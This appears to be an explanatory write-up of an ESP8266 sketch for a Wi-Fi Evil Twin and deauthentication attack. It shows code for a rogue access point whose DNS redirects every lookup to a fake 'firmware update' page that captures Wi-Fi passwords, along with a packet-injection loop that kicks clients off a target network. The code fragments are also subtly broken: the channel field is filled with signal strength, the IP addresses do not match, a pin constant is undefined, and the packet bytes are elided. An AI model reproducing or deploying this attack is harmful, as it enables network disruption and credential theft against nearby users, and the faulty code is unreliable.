This code is a sketch for the ESP8266 microcontroller, implementing a Wi-Fi deauthentication attack and Evil Twin attack. The script sets up a Wi-Fi access point that masquerades as a legitimate network to capture passwords, while it can also send deauthentication packets to disrupt nearby networks. Here's a detailed explanation of its key components and functionality:
------------------------------------------------------------------------------------
1. Libraries and Definitions
#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <ESP8266HTTPClient.h>
----
ESP8266WiFi.h: Manages Wi-Fi connectivity for the ESP8266.
DNSServer.h: Handles DNS requests to spoof domain name resolutions.
ESP8266WebServer.h: Sets up a web server for the ESP8266.
ESP8266HTTPClient.h: Enables HTTP communications.
----------------------------------------------------------------------
2. Network Struct

typedef struct {
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
} _Network;

_Network _networks[16];
_Network _selectedNetwork;
------------------------------------
_Network: A structure holding information about a Wi-Fi network, including SSID, channel, and BSSID (MAC address).
_networks[16]: Array for storing up to 16 detected Wi-Fi networks.
_selectedNetwork: Stores the currently selected network for the Evil Twin attack.
-------------------------------------------------------
3. DNS and Web Server Setup

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 1, 1);
DNSServer dnsServer;
ESP8266WebServer webServer(80);
-------------------------------------------------------------------
Configures a DNS server to resolve all requests to a local IP, tricking connected clients into thinking they are reaching the real network.
Sets up a web server on port 80 to host the phishing webpage.
-------------------------------------------------------------------
4. HTML Pages and Responses
The header, footer, and index functions generate HTML content for the phishing pages. The index page mimics a "router firmware update" error page, prompting the user to enter their Wi-Fi password.

header(String t): Generates the HTML header.
footer(): Creates the footer of the webpage.
index(): Creates the form where users input their Wi-Fi password.
------------------------------------------------------------------------
5. Setup Function

void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_AP_STA);
  wifi_promiscuous_enable(1);
  WiFi.softAP("Evil-TwiN", "devil2in");
  dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
  pinMode(EvilTwinPin, OUTPUT);
  digitalWrite(EvilTwinPin, HIGH);

  webServer.on("/", handleIndex);
  webServer.on("/result", handleResult);
  webServer.begin();
}
-------------------------------------
Configures the ESP8266 as an Access Point (AP) with the SSID "Evil-TwiN" and password "devil2in".
Starts a DNS server to redirect all requests to the local web server.
Sets up web routes to serve the phishing page and handle form submissions.
---------------------------------------------------------------------------------
6. Scanning Networks

void performScan() {
  int n = WiFi.scanNetworks();
  clearArray();
  for (int i = 0; i < n && i < 16; ++i) {
    _Network network;
    network.ssid = WiFi.SSID(i);
    memcpy(network.bssid, WiFi.BSSID(i), 6);
    network.ch = WiFi.RSSI(i);
    _networks[i] = network;
  }
}
-----------
Scans for available Wi-Fi networks and stores their SSID, BSSID, and signal strength in the _networks array.
-----------------------------------------------------------------------
7. Handling User Interaction

handleIndex(): Serves the main webpage, displaying the form for Wi-Fi password input.
handleResult(): Checks the submitted password. If correct, it logs the password. If incorrect, it sends an error page.
-------------------------------------------------
8. Deauthentication Attack

if (deauthing_active && millis() - deauth_now >= 1000) {
  wifi_set_channel(_selectedNetwork.ch);
  uint8_t deauthPacket[26] = {0xC0, 0x00, ... };
  wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
}
--
Sends deauthentication packets to kick devices off the selected network.
------------------------------------------------
9. Loop Function

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
  if (deauthing_active) {
    // Code for sending deauth packets
  }
}
------
Continuously handles DNS requests and processes web server requests.
Executes the deauthentication attack if activated.
---------------------------
"This code was developed by myself as part of a project involving Wi-Fi security exploration. While I wrote the code, I also conducted research online to better understand the technical aspects of deauthentication attacks, Evil Twin attacks, and Wi-Fi programming on the ESP8266. Several resources, tutorials, and documentation were consulted during the development process to ensure proper implementation and optimization."
